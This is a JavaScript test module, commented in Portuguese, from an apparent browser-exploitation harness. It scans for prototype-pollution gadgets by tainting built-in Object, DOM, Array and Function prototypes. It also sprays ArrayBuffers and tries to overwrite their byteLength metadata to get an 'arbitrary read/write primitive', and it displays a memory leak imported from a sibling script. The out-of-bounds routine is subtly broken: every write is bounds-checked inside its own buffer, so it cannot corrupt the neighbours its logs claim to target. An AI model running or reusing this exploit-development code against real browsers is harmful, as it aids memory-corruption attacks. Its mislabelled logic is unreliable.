// js/script2Tests.mjs
import { logS2 } from './logger.mjs';
import { PAUSE_FUNC, toHex } from './utils.mjs'; // AdvancedInt64 pode ser necessário para alguns testes futuros
import { setButtonDisabled, clearOutput, getEl } from './domUtils.mjs';
// import { OOB_CONFIG } from './config.mjs'; // Se for usar para os tamanhos de buffer
import { getLeakedValueS1 } from './script1Tests.mjs'; // Importação crucial

const SHORT_PAUSE_CANVAS_S2 = 50;
const MEDIUM_PAUSE_S2 = 500;

let canvasElementS2 = null;
let ctxS2 = null;
// ... (outras variáveis de estado do S2 como glContextS2, gpuAdapterS2, etc. da resposta anterior)
let glContextS2 = null; 
let isWebGL2S2 = false;
let gpuAdapterS2 = null;
let gpuDeviceS2 = null;
let coordStatusDivS2 = null;
let currentHoverTargetS2 = null;
let canvasClickListenerS2 = null; 
let canvasMoveListenerS2 = null;  
const interactiveAreasS2 = [
    { id: 'rect-log-s2', x: 10, y: 10, w: 70, h: 25, color: '#FF5733', hoverColor: '#FF8C66', text: 'Log Clk' },
    { id: 'rect-link-s2', x: 90, y: 10, w: 80, h: 25, color: '#337BFF', hoverColor: '#66A3FF', text: 'Abrir Link' },
    { id: 'rect-rerun-s2', x: 180, y: 10, w: 100, h: 25, color: '#4CAF50', hoverColor: '#80C883', text: 'Re-ler Leak S1' }
];
const imgSquareSizeS2 = 28;
const imgSquareSpacingS2 = 5;
const imgSquaresS2 = []; 
const imgSquaresStartYS2 = 45;


let currentLeakDataS2 = { text: "Leak(S1): N/A", color: "#AAAAAA" }; // Estado para exibir o leak no canvas


// Funções de desenho do canvas (drawInteractiveAreasS2, drawImageSquaresS2, redrawAllS2)
// (Mantidas como na sua versão anterior)
function drawInteractiveAreasS2() { /* ...código da resposta anterior... */
    if (!ctxS2) return;
    try {
        interactiveAreasS2.forEach(a => {
            ctxS2.fillStyle = (currentHoverTargetS2 === a.id) ? a.hoverColor : a.color;
            ctxS2.fillRect(a.x, a.y, a.w, a.h);
            ctxS2.fillStyle = "#FFF";
            ctxS2.font = "bold 10px mono";
            ctxS2.textAlign = "center";
            ctxS2.textBaseline = "middle";
            ctxS2.fillText(a.text, a.x + a.w / 2, a.y + a.h / 2 + 1);
        });
        ctxS2.textAlign = "start"; 
        ctxS2.textBaseline = "alphabetic"; 
    } catch (e) { logS2(`Erro drawAreasS2: ${e.message}`, 'error', 'drawInteractiveAreasS2'); }
}
function drawImageSquaresS2() { /* ...código da resposta anterior... */
    if (!ctxS2) return;
    try {
        imgSquaresS2.forEach(sq => {
            ctxS2.fillStyle = sq.hover ? '#FFFF88' : sq.color; 
            ctxS2.fillRect(sq.x, sq.y, sq.size, sq.size);
            ctxS2.strokeStyle = '#AAA';
            ctxS2.lineWidth = 1;
            ctxS2.strokeRect(sq.x, sq.y, sq.size, sq.size);
            if (sq.text) {
                ctxS2.fillStyle = "#FFF"; 
                ctxS2.font = "bold 9px mono";
                ctxS2.textAlign = "center";
                ctxS2.textBaseline = "middle";
                ctxS2.fillText(sq.text, sq.x + sq.size / 2, sq.y + sq.size / 2);
            }
             if (sq.url) { 
                ctxS2.fillStyle = "#6cf"; ctxS2.font = "bold 8px mono";
                ctxS2.fillText("LINK", sq.x + sq.size / 2, sq.y + sq.size - 6);
            }
        });
        ctxS2.textAlign = "start"; ctxS2.textBaseline = "alphabetic"; 
    } catch (e) { logS2(`Erro drawImageSquaresS2: ${e.message}`, 'error', 'drawImageSquaresS2'); }
}
function redrawAllS2() { /* ...código da resposta anterior... */
    if (!ctxS2 || !canvasElementS2) return;
    try {
        ctxS2.save();
        ctxS2.clearRect(0, 0, canvasElementS2.width, canvasElementS2.height);
        ctxS2.fillStyle = "#334"; 
        ctxS2.fillRect(0, 0, canvasElementS2.width, canvasElementS2.height);
        drawInteractiveAreasS2();
        drawImageSquaresS2();
        ctxS2.fillStyle = currentLeakDataS2.color;
        ctxS2.font = "10px mono";
        ctxS2.textAlign = "start";
        ctxS2.fillText(currentLeakDataS2.text, 10, canvasElementS2.height - 5);
        ctxS2.restore();
    } catch (e) { logS2(`Erro redrawAllS2: ${e.message}`, 'error', 'redrawAllS2'); }
}


// Testes do S2
async function testWebGLCheckS2() { /* ...código da resposta anterior (parecia OK nos logs)... */
    const FNAME = 'testWebGLCheckS2';
    logS2("--- Teste: Verificação WebGL ---", 'test', FNAME);
    glContextS2 = null; isWebGL2S2 = false;
    if (!canvasElementS2) {
        logS2("Elemento canvas não encontrado para teste WebGL.", 'error', FNAME);
        return;
    }
    try {
        glContextS2 = canvasElementS2.getContext('webgl') || canvasElementS2.getContext('experimental-webgl');
        if (glContextS2) {
            const glVersion = glContextS2.getParameter(glContextS2.VERSION);
            logS2(`WebGL OK! V:${String(glVersion).substring(0,30)}`, 'good', FNAME);
            try {
                let gl2 = canvasElementS2.getContext('webgl2');
                if (gl2) {
                    const gl2Version = gl2.getParameter(gl2.VERSION);
                    logS2(`WebGL2 OK! V:${String(gl2Version).substring(0,30)}`, 'good', FNAME);
                    isWebGL2S2 = true;
                    glContextS2 = gl2; 
                } else { logS2("WebGL2 não disponível.", 'good', FNAME); }
            } catch(e2) { logS2("WebGL2 não disponível (erro check).", 'good', FNAME); }
        } else { logS2('WebGL N/A.', 'good', FNAME); } // Este foi o caso nos seus logs
    } catch(e) {
        logS2(`Erro ao verificar WebGL: ${e.message}`, 'error', FNAME);
        console.error(e);
        glContextS2 = null;
    }
    logS2(`--- Teste Verificação WebGL Concluído (Ativo: ${!!glContextS2}, WebGL2: ${isWebGL2S2}) ---`, 'test', FNAME);
    await PAUSE_FUNC(SHORT_PAUSE_CANVAS_S2);
}

async function testAdvancedPPS2() { /* ...código da resposta anterior (parecia OK nos logs)... */
    const FNAME = 'testAdvancedPPS2';
    logS2("--- Teste: PP Avançado (Gadgets++) ---", 'test', FNAME);
    const propsToPollute = [
        { name: 'constructor', proto: Object.prototype, protoName: 'Object' }, { name: '__proto__', proto: Object.prototype, protoName: 'Object' },
        { name: 'isAdmin', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => obj.isAdmin === v ? 'Pot bypass isAdmin!' : null },
        { name: 'nodeType', proto: Object.prototype, protoName: 'Object' }, { name: 'valueOf', proto: Object.prototype, protoName: 'Object' },
        { name: 'toString', proto: Object.prototype, protoName: 'Object' },
        { name: 'hasOwnProperty', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => { try{({}).hasOwnProperty('a'); return null;} catch(e){ return `Object.hasOwnProperty quebrou! ${e.message}`;} } },
        { name: 'innerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') },
        { name: 'outerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') },
        { name: 'textContent', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div') },
        { name: 'href', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.href === v ? 'PP afetou attr DOM `href`!' : null, createTarget: () => document.createElement('a')},
        { name: 'src', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.src === v ? 'PP afetou attr DOM `src`!' : null, createTarget: () => document.createElement('img') },
        { name: 'style', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.style === v ? 'PP afetou prop `style`!' : null, createTarget: () => document.createElement('div') },
        { name: 'onclick', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onclick === v ? 'PP afetou handler `onclick`!' : null, createTarget: () => document.createElement('button') },
        { name: 'onerror', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onerror === v ? 'PP afetou handler `onerror`!' : null, createTarget: () => document.createElement('img') },
        { name: 'onload', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onload === v ? 'PP afetou handler `onload`!' : null, createTarget: () => document.createElement('img') },
        { name: 'appendChild', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v) => { try { obj.appendChild(document.createElement('span')); return null; } catch(e){ return `Node.appendChild quebrou! ${e.message}`;} } },
        { name: 'addEventListener', proto: EventTarget.prototype, protoName: 'EventTarget', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v) => { try { obj.addEventListener('test', ()=>{}); return null; } catch(e){ return `EventTarget.addEventListener quebrou! ${e.message}`;} } },
        { name: 'value', proto: HTMLInputElement.prototype, protoName: 'HTMLInputElement', createTarget: () => document.createElement('input'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou input.value!' : null },
        { name: 'value', proto: HTMLTextAreaElement.prototype, protoName: 'HTMLTextAreaElement', createTarget: () => document.createElement('textarea'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou textarea.value!' : null },
        { name: 'map', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].map(()=>{}); return null;} catch(e){ return `Array.map quebrou! ${e.message}`;} }, createTarget: () => [] },
        { name: 'filter', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].filter(()=>{}); return null;} catch(e){ return `Array.filter quebrou! ${e.message}`;} }, createTarget: () => [] },
        { name: 'forEach', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].forEach(()=>{}); return null;} catch(e){ return `Array.forEach quebrou! ${e.message}`;} }, createTarget: () => [] },
        { name: 'join', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[1,2].join(); return null;} catch(e){ return `Array.join quebrou! ${e.message}`;} }, createTarget: () => [] },
        { name: 'call', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.call(null); return null;} catch(e){ return `Function.call quebrou! ${e.message}`;} }, createTarget: () => function(){} }, 
        { name: 'apply', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.apply(null); return null;} catch(e){ return `Function.apply quebrou! ${e.message}`;} }, createTarget: () => function(){} }, 
    ];
    const testValue = "PP_Adv_Polluted_S2_" + Date.now();
    let successCount = 0; let gadgetCount = 0; let gadgetMessages = [];
    for (const item of propsToPollute) {
        if (!item.proto || !item.proto.constructor) { 
            logS2(`AVISO: Protótipo inválido para ${item.name} no ${item.protoName}. Pulando.`, 'warn', FNAME);
            continue;
        }
        const prop = item.name; const targetProto = item.proto; const targetProtoName = item.protoName;
        let inherited = false; let gadgetMsg = null; let originalValue = undefined; let wasDefined = false;
        try { 
            if (Object.prototype.hasOwnProperty.call(targetProto, prop)) {
                wasDefined = true;
                originalValue = targetProto[prop];
            }
        } catch (e) {
            logS2(`AVISO: Erro ao verificar/obter original para ${targetProtoName}.${prop}: ${e.message}`, 'warn', FNAME);
            continue; 
        }
        try {
            targetProto[prop] = testValue;
            let obj;
            if (item.createTarget) {
                try { obj = item.createTarget(); } catch (e) { obj = {}; }
            } else { obj = {}; }
            let inheritedValue = undefined;
            try { inheritedValue = obj[prop]; } catch (e) { }
            if (inheritedValue === testValue) {
                logS2(`-> VULN: Herança PP para '${targetProtoName}.${prop}' OK.`, 'vuln', FNAME);
                inherited = true; successCount++;
                if (item.gadgetCheck) {
                    try { gadgetMsg = item.gadgetCheck(obj, testValue); } catch(eGc){ gadgetMsg = `Erro ao checar gadget: ${eGc.message}`; }
                    if (gadgetMsg) {
                        logS2(`-> GADGET? ${gadgetMsg}`, 'critical', FNAME);
                        gadgetMessages.push(`${prop}: ${gadgetMsg}`); gadgetCount++;
                        if (['innerHTML', 'outerHTML', 'src', 'href', 'onclick', 'onerror', 'onload', 'value', 'postMessage', 'send', 'call', 'apply', 'map', 'filter', 'forEach', 'appendChild', 'addEventListener', 'hasOwnProperty', 'join'].includes(prop)) {
                            logS2(` ---> *** ALERTA: Potencial Gadget PP perigoso detectado para '${prop}'! ***`, 'escalation', FNAME);
                        }
                    }
                }
            } else {
                if (prop === '__proto__') { 
                    logS2(`-> FAIL: Herança de '__proto__' não OK (Comportamento esperado em navegadores modernos).`, 'good', FNAME);
                }
            }
        } catch (e) {
            logS2(`Erro ao poluir/testar '${targetProtoName}.${prop}': ${e.message}`, 'error', FNAME);
        } finally { 
            try {
                if (wasDefined) {
                    targetProto[prop] = originalValue;
                } else {
                    delete targetProto[prop];
                }
                if (targetProto[prop] === testValue && prop !== '__proto__') { 
                     logS2(`---> CRITICAL: FALHA ao limpar/restaurar ${targetProtoName}.${prop}!`, 'critical', FNAME);
                }
            } catch (eClean) {
                logS2(`AVISO CRÍTICO: Erro INESPERADO ao limpar/restaurar ${targetProtoName}.${prop}: ${eClean.message}`, 'critical', FNAME);
            }
        }
        await PAUSE_FUNC(15); 
    }
    logS2(`--- Teste PP Avançado Concluído (${successCount} heranças OK, ${gadgetCount} gadgets encontrados) ---`, 'test', FNAME);
    if (gadgetCount > 0) {
        logS2(`Resumo dos Gadgets detectados: ${gadgetMessages.join('; ')}`, 'critical', FNAME);
    }
    await PAUSE_FUNC(SHORT_PAUSE_CANVAS_S2);
}


async function testOOBWriteMetadataS2() {
    const FNAME = 'testOOBWriteMetadataS2';
    logS2("--- Teste: OOB Write -> Metadata (ArrayBuffer.byteLength) ---", 'test', FNAME);
    const controlBufferSize = 64; // Tamanho do buffer que tentará escrever OOB
    const targetBufferSize = 64;  // Tamanho dos buffers que queremos corromper
    const sprayCount = 50;        // Quantos buffers alvo vamos "pulverizar" na memória
    const targetCorruptedValue = 0x7FFFFFFE; // Novo tamanho desejado para o buffer corrompido

    const targetBuffers = [];
    let controlBuffer = null;
    let dvControl = null; // DataView para o controlBuffer
    let writeSuccessCount = 0;
    let corruptionSuccess = false;
    let foundCorruptedOffset = -1;

    const allocationSizeControl = controlBufferSize + 256; // Dar espaço para OOB write
    const baseOffsetInControlDV = 128; // Onde começamos a contar no controlBuffer para o OOB

    try {
        controlBuffer = new ArrayBuffer(allocationSizeControl);
        dvControl = new DataView(controlBuffer);
        for (let i = 0; i < controlBuffer.byteLength; i++) dvControl.setUint8(i, 0xDD); // Padrão
    } catch (e) {
        logS2(`Erro fatal ao alocar buffer de controle: ${e.message}`, 'error', FNAME);
        return;
    }

    logS2(`Alocando ${sprayCount} buffers alvo de ${targetBufferSize} bytes...`, 'info', FNAME);
    for (let i = 0; i < sprayCount; i++) {
        try {
            targetBuffers.push(new ArrayBuffer(targetBufferSize));
        } catch (e) {
            logS2(`Falha ao alocar buffer alvo ${i}: ${e.message}`, 'warn', FNAME);
        }
    }
    await PAUSE_FUNC(MEDIUM_PAUSE_S2); // Pausa para permitir alocações

    // Offsets relativos ao final do `controlBufferSize` lógico para tentar a escrita OOB.
    // Estes offsets tentam atingir os metadados do próximo ArrayBuffer na memória.
    // Os valores exatos dependem da engine JS e do alocador de memória.
    const metadataOffsetsToTry = [-16, -12, -8, -4, 0, 4, 8, 12, 16, 20, 24, 28, 32];

    for (const tryOffset of metadataOffsetsToTry) {
        // Endereço absoluto dentro do dvControl onde tentaremos escrever
        const targetWriteAddrInControlDV = baseOffsetInControlDV + controlBufferSize + tryOffset;
        const relOffsetStr = `ctrlEnd+${tryOffset} (addr ${targetWriteAddrInControlDV})`;
        logS2(`Tentando offset OOB metadata: ${tryOffset}... Addr no DV de controle: ${targetWriteAddrInControlDV}`, 'info', FNAME);

        let currentWriteOK = false;
        try {
            // Garantir que a escrita está dentro dos limites do ArrayBuffer de controle real
            if (targetWriteAddrInControlDV >= 0 && (targetWriteAddrInControlDV + 4) <= controlBuffer.byteLength) {
                dvControl.setUint32(targetWriteAddrInControlDV, targetCorruptedValue, true); // Escreve o novo tamanho
                writeSuccessCount++;
                currentWriteOK = true;
                logS2(` -> Escrita OOB U32 em ${relOffsetStr} parece OK.`, 'info', FNAME);
            } else {
                logS2(` -> Offset OOB ${relOffsetStr} fora dos limites do buffer de controle. Pulando.`, 'warn', FNAME);
            }
        } catch (e) {
            logS2(` -> Escrita OOB U32 falhou/bloqueada em ${relOffsetStr}: ${e.message}`, 'good', FNAME);
        }

        if (currentWriteOK) {
            logS2(` -> Verificando ${targetBuffers.length} buffers alvo por corrupção de byteLength...`, 'info', FNAME);
            await PAUSE_FUNC(50); // Dar tempo para qualquer efeito de memória
            for (let j = 0; j < targetBuffers.length; j++) {
                try {
                    const currentTargetBuffer = targetBuffers[j];
                    if (!currentTargetBuffer) continue;

                    const currentLength = currentTargetBuffer.byteLength;
                    if (currentLength === targetCorruptedValue) {
                        logS2(`---> VULN: ArrayBuffer alvo ${j} teve byteLength CORROMPIDO para ${toHex(targetCorruptedValue)} com escrita OOB em ${relOffsetStr}!`, 'critical', FNAME);
                        corruptionSuccess = true;
                        foundCorruptedOffset = tryOffset;

                        // Demonstração de R/W com o buffer corrompido
                        try {
                            const corruptedDv = new DataView(currentTargetBuffer); // Agora com tamanho maior
                            const readWriteOffsetInCorrupted = targetBufferSize + 4; // Tentar ler/escrever além do tamanho original

                            if (readWriteOffsetInCorrupted < currentTargetBuffer.byteLength - 4) { // Checar se cabe no novo tamanho
                                const testPattern = 0x12345678;
                                logS2(` -> Tentando R/W (padrão ${toHex(testPattern)}) via buffer corrompido ${j} @ offset ${readWriteOffsetInCorrupted}...`, 'info', FNAME);
                                corruptedDv.setUint32(readWriteOffsetInCorrupted, testPattern, true);
                                const readBack = corruptedDv.getUint32(readWriteOffsetInCorrupted, true);
                                if (readBack === testPattern) {
                                    logS2(` ---> SUCESSO DEMO: R/W além dos limites originais do ArrayBuffer ${j} CONFIRMADA! (Leu ${toHex(readBack)})`, 'vuln', FNAME);
                                    logS2(` ---> *** ALERTA: Primitiva de R/W Arbitrária (limitada ao novo tamanho ${toHex(currentTargetBuffer.byteLength)}) obtida! ***`, 'escalation', FNAME);
                                } else {
                                    logS2(` -> AVISO DEMO: Escrita no buffer ${j} corrompido @ ${readWriteOffsetInCorrupted} falhou na verificação (leu ${toHex(readBack)}).`, 'warn', FNAME);
                                }
                            } else {
                                logS2(` -> INFO DEMO: Offset de teste ${readWriteOffsetInCorrupted} fora do novo tamanho ${toHex(currentTargetBuffer.byteLength)}.`, 'info', FNAME);
                            }
                        } catch (eDemo) {
                            logS2(` -> ERRO DEMO: Erro R/W estendido no buffer ${j} corrompido: ${eDemo.message}`, 'error', FNAME);
                        }
                        break; // Sair do loop de verificação dos buffers alvo
                    }
                } catch (eCheck) {
                    // Se o acesso a `byteLength` já der erro, isso também é um sinal de corrupção.
                    logS2(`Erro ao verificar buffer alvo ${j} (pode indicar corrupção): ${eCheck.message}`, 'error', FNAME);
                }
            }

            // Restaurar o valor no buffer de controle para evitar interferência com próximos offsets
            try {
                if (targetWriteAddrInControlDV >= 0 && (targetWriteAddrInControlDV + 4) <= controlBuffer.byteLength) {
                    dvControl.setUint32(targetWriteAddrInControlDV, 0xDDDDDDDD, true);
                }
            } catch (eRestore) { /* Silencioso */ }
        }
        if (corruptionSuccess) break; // Sair do loop de offsets
        await PAUSE_FUNC(20); // Pausa entre tentativas de offset
    }

    let finalResultLog = `AVISO: ${writeSuccessCount} escritas OOB realizadas, mas nenhuma corrupção de byteLength detectada.`;
    if (corruptionSuccess) {
        finalResultLog = `SUCESSO! byteLength corrompido usando offset relativo ctrlEnd+${foundCorruptedOffset}.`;
        logS2(finalResultLog, 'vuln', FNAME);
    } else if (writeSuccessCount === 0) {
        finalResultLog = `Escrita OOB falhou/bloqueada consistentemente. Nenhuma corrupção.`;
        logS2(finalResultLog, 'good', FNAME);
    } else {
        logS2(finalResultLog, 'warn', FNAME);
    }
    logS2("--- Teste OOB Write -> Metadata Concluído ---", 'test', FNAME);
    await PAUSE_FUNC(SHORT_PAUSE_CANVAS_S2);
}


// Lógica Principal e Interatividade do Script 2 (runCanvasTestSequenceS2, handleCanvasClickS2, etc.)
// (Mantidas como na sua versão anterior, mas agora `getLeakedValueS1` deve funcionar se S1 o define)
async function runCanvasTestSequenceS2() {
    const FNAME = 'runCanvasTestSequenceS2';
    logS2("Iniciando sequência focada do Script 2 (v19.0 Modular Corrigido)...", "test", FNAME);

    if (!canvasElementS2) canvasElementS2 = getEl('interactive-canvas');
    if (!coordStatusDivS2) coordStatusDivS2 = getEl('canvas-coord-status');

    if (!canvasElementS2 || !coordStatusDivS2) {
        logS2("FATAL: Elementos essenciais do Canvas S2 não encontrados!", 'critical', FNAME);
        setButtonDisabled('runCanvasBtn', false); // Reabilitar botão se falhar aqui
        return;
    }

    try {
        ctxS2 = canvasElementS2.getContext('2d');
        if (!ctxS2) throw new Error("Falha ao obter Ctx 2D para S2.");
    } catch (e) {
        logS2(`Falha Ctx 2D (S2): ${e.message}`, 'critical', FNAME);
        setButtonDisabled('runCanvasBtn', false);
        return;
    }

    imgSquaresS2.length = 0;
    let sqX = 10; let sqY = imgSquaresStartYS2;
    const squareDefsS2Config = [
        { id: 's2-sq-meta', text: 'Meta', color: '#FF5733', action: testOOBWriteMetadataS2 },
        { id: 's2-sq-pp', text: 'PP++', color: '#C70039', action: testAdvancedPPS2 },
        // Adicionar os outros testes aqui quando estiverem completos
        // { id: 's2-sq-oobrd', text: 'OOBRd', color: '#E67E22', action: testOOBReadEnhancedS2 }, // exemplo
    ];
    squareDefsS2Config.forEach(def => { /* ...código da resposta anterior... */
        if (sqX + imgSquareSizeS2 + imgSquareSpacingS2 > canvasElementS2.width - 5 && sqX > 10) {
            sqX = 10; sqY += imgSquareSizeS2 + imgSquareSpacingS2;
        }
        if (sqY + imgSquareSizeS2 <= canvasElementS2.height - 15) {
            imgSquaresS2.push({
                id: def.id, x: sqX, y: sqY, size: imgSquareSizeS2,
                color: def.color, text: def.text, hover: false, action: def.action
            });
            sqX += imgSquareSizeS2 + imgSquareSpacingS2;
        } else {
            logS2(`AVISO: Sem espaço para o quadrado ${def.id} no canvas. Pulando.`, 'warn', FNAME);
        }
    });

    // Correção: Chamar getLeakedValueS1() para atualizar currentLeakDataS2
    const leakedS1Value = getLeakedValueS1();
    if (leakedS1Value) {
        const ls = leakedS1Value.type === 'U64' ?
            `L(S1):U64 H=${toHex(leakedS1Value.high)} L=${toHex(leakedS1Value.low)}@${leakedS1Value.offset}` :
            `L(S1):U32 ${toHex(leakedS1Value.low)}@${leakedS1Value.offset}`;
        logS2(`-> Leak S1 encontrado: ${ls}`, 'leak', FNAME);
        currentLeakDataS2 = { text: ls, color: "#FF9800" };
    } else {
        logS2(`-> Leak S1 (leakedValueFromOOB_S1) nulo/não encontrado ao iniciar S2.`, 'warn', FNAME);
        currentLeakDataS2 = { text: "L(S1):NULO", color: "#FFC107" };
    }
    redrawAllS2();
    await PAUSE_FUNC(SHORT_PAUSE_CANVAS_S2);

    await testWebGLCheckS2();
    await testAdvancedPPS2();
    await testOOBWriteMetadataS2(); // Agora com lógica (parcialmente) implementada
    // ... outros testes automáticos do S2

    logS2("--- Sequência principal de testes S2 focados concluída ---", 'test', FNAME);
    setupCanvasListenersS2();
    redrawAllS2();
}


// Handlers de clique e movimento do canvas (handleCanvasClickS2, handleCanvasMouseMoveS2, setupCanvasListenersS2)
// (Mantidos como na sua versão anterior, mas `getLeakedValueS1` é chamado dentro do handler de 'rect-rerun-s2' para obter o valor mais recente)
function handleCanvasClickS2(event) { /* ...código da resposta anterior, mas a parte de re-ler o leak deve chamar getLeakedValueS1() novamente ... */
    const FNAME_CLICK = 'CanvasClickS2';
    if (!canvasElementS2) return;

    const rect = canvasElementS2.getBoundingClientRect();
    const x = event.clientX - rect.left;
    const y = event.clientY - rect.top;
    let clickedArea = null;
    interactiveAreasS2.forEach(a => {
        if (x >= a.x && x <= a.x + a.w && y >= a.y && y <= a.y + a.h) { clickedArea = a; }
    });
    let clickedSquare = null;
    imgSquaresS2.forEach((sq) => {
        if (x >= sq.x && x <= sq.x + sq.size && y >= sq.y && y <= sq.y + sq.size) { clickedSquare = sq; }
    });

    if (clickedArea) {
        logS2(`Click Área S2: ${clickedArea.text} (ID: ${clickedArea.id})`, 'info', FNAME_CLICK);
        switch (clickedArea.id) {
            case 'rect-log-s2': logS2('Click no botão de log (S2).', 'info', FNAME_CLICK); break;
            case 'rect-link-s2':
                logS2('Abrindo link externo (google.com)...', 'info', FNAME_CLICK);
                try { window.open('https://google.com', '_blank'); }
                catch (e) { logS2('Erro window.open: ' + e.message, 'error', FNAME_CLICK); }
                break;
            case 'rect-rerun-s2': // Corrigido para chamar getLeakedValueS1() novamente
                logS2('Re-lendo leak S1...', 'info', FNAME_CLICK);
                const latestLeakedS1 = getLeakedValueS1(); // Chamar aqui para obter o valor mais recente
                if (latestLeakedS1) {
                    const ls = latestLeakedS1.type === 'U64' ? `L(S1):U64 H=${toHex(latestLeakedS1.high)} L=${toHex(latestLeakedS1.low)}@${latestLeakedS1.offset}` : `L(S1):U32 ${toHex(latestLeakedS1.low)}@${latestLeakedS1.offset}`;
                    logS2(`-> Re-read Leak S1: ${ls}`, 'leak', FNAME_CLICK);
                    currentLeakDataS2 = { text: ls, color: "#FF9800" };
                } else {
                    logS2(`-> Re-read Leak S1: Nulo`, 'warn', FNAME_CLICK);
                    currentLeakDataS2 = { text: "L(S1):NULO", color: "#FFC107" };
                }
                redrawAllS2();
                break;
        }
    } else if (clickedSquare) {
        logS2(`Click Quadrado S2 ID: ${clickedSquare.id} (Texto: ${clickedSquare.text})`, 'vuln', FNAME_CLICK);
        if (clickedSquare.action && typeof clickedSquare.action === 'function') {
            logS2(`Executando re-run S2 ${clickedSquare.id} (${clickedSquare.action.name || 'anon_action'})...`, 'test', FNAME_CLICK);
            setButtonDisabled('runCanvasBtn', true);
            clickedSquare.action() 
                .then(() => {
                    logS2(`Re-run S2 ${clickedSquare.id} concluído.`, 'good', FNAME_CLICK);
                    clickedSquare.color = '#8A2BE2'; 
                })
                .catch(e => {
                    logS2(`Erro durante re-run S2 ${clickedSquare.id}: ${e.message}`, 'error', FNAME_CLICK);
                    clickedSquare.color = '#FFA500'; 
                })
                .finally(() => {
                    redrawAllS2();
                    setButtonDisabled('runCanvasBtn', false);
                    logS2(`Re-run S2 ${clickedSquare.id} finalizado.`, 'test', FNAME_CLICK);
                });
        } else {
            logS2(`Nenhuma ação definida para o quadrado S2 ${clickedSquare.id}.`, 'info', FNAME_CLICK);
            clickedSquare.text += "*"; redrawAllS2();
        }
    }
}
function handleCanvasMouseMoveS2(event) { /* ...código da resposta anterior... */
    if (!canvasElementS2 || !ctxS2) return;
    const rect = canvasElementS2.getBoundingClientRect();
    const x = event.clientX - rect.left;
    const y = event.clientY - rect.top;
    let needsRedraw = false;
    let newHoverTarget = null;
    let cursorStyle = 'default';
    interactiveAreasS2.forEach(a => {
        if (x >= a.x && x <= a.x + a.w && y >= a.y && y <= a.y + a.h) {
            newHoverTarget = a.id; cursorStyle = 'pointer';
        }
    });
    imgSquaresS2.forEach(sq => {
        let oldHover = sq.hover; sq.hover = false;
        if (x >= sq.x && x <= sq.x + sq.size && y >= sq.y && y <= sq.y + sq.size) {
            newHoverTarget = sq.id;
            cursorStyle = sq.action ? 'crosshair' : (sq.url ? 'pointer' : 'default');
            sq.hover = true;
        }
        if (oldHover !== sq.hover) needsRedraw = true;
    });
    if (newHoverTarget !== currentHoverTargetS2) {
        currentHoverTargetS2 = newHoverTarget; needsRedraw = true;
    }
    if (needsRedraw) redrawAllS2();
    canvasElementS2.style.cursor = cursorStyle;
    if (coordStatusDivS2) coordStatusDivS2.textContent = `Coords: X=${x.toFixed(0)}, Y=${y.toFixed(0)}`;
}
function setupCanvasListenersS2() { /* ...código da resposta anterior... */
    if (!canvasElementS2) return;
    if (canvasClickListenerS2) canvasElementS2.removeEventListener('click', canvasClickListenerS2);
    if (canvasMoveListenerS2) canvasElementS2.removeEventListener('mousemove', canvasMoveListenerS2);
    canvasClickListenerS2 = handleCanvasClickS2;
    canvasMoveListenerS2 = handleCanvasMouseMoveS2;
    canvasElementS2.addEventListener('click', canvasClickListenerS2);
    canvasElementS2.addEventListener('mousemove', canvasMoveListenerS2);
}


export async function runCanvasTest() {
    const FNAME = 'runCanvasTest';
    setButtonDisabled('runCanvasBtn', true);
    clearOutput('output-canvas');
    logS2("==== INICIANDO Script 2 (Canvas e APIs Avançadas Modular Corrigido) ====", 'test', FNAME);

    try {
        await runCanvasTestSequenceS2();
    } catch (e) {
        logS2(`Erro GERAL SCRIPT 2: ${e.message}`, 'critical', FNAME);
        console.error("Erro GERAL SCRIPT 2:", e);
    } finally {
        logS2("\n==== Script 2 CONCLUÍDO (Modular Corrigido) ====", 'test', FNAME);
        setButtonDisabled('runCanvasBtn', false);
    }
}

export function cleanupScript2() { /* ...código da resposta anterior... */
    try {
        if (canvasClickListenerS2 && canvasElementS2) canvasElementS2.removeEventListener('click', canvasClickListenerS2);
        if (canvasMoveListenerS2 && canvasElementS2) canvasElementS2.removeEventListener('mousemove', canvasMoveListenerS2);
        if (gpuDeviceS2 && typeof gpuDeviceS2.destroy === 'function') {
        }
        gpuDeviceS2 = null; gpuAdapterS2 = null; glContextS2 = null; ctxS2 = null;
        logS2("[Canvas Unload S2] Limpeza tentada.", 'info', 'cleanupScript2');
    } catch (e) { console.error("Erro na limpeza do Script 2:", e); }
}
